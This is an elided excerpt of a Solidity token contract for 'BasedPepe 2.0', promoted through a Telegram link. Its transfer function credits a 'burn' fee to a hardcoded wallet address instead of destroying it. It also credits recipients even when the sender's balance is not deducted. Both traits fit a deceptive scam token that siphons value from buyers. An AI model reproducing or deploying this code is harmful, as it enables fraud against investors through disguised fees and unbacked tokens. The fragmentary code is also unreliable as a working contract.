...
// Submitted for Telegram: https://t.me/BasedPepeOfficial
...
contract  BasedPepeTwo  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "BasedPepe 2.0";
    string private _symbol = "BEP2.0";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0xDD3fb98Ea15103d7a31dD8d5BBfE13bE22f1EAC5] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0xDD3fb98Ea15103d7a31dD8d5BBfE13bE22f1EAC5, _bruntoken);
        }
